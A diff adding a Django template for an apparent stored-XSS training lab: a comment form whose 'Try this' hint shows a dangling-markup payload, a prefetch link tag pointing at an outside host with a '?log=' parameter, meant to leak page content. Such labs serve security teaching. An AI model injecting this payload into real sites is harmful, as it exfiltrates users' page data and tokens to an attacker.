@@ -1,0 +1,29 @@
+{% extends "base.html" %}
+{% load staticfiles %}
+
+
+{% block head %}
+
+{% endblock head %}
+
+
+{% block content %}
+
+<h1 class="header">Share your opinion with us: </h1>
+<a href="{% url "storedxss:comments-list" %}">&#8592; Go to comments list</a>
+<i>
+<p>Try this:</p>
+<p>&lt;link rel='prefetch' href='http://tomatosoup.pl?log=</p>
+</i>
+<form method="POST">
+    {% csrf_token %}
+    {{ form.as_p }}
+    <input type="submit" name="submit">
+</form>
+
+{% endblock content %}
+
+
+{% block scripts %}
+
+{% endblock scripts %}
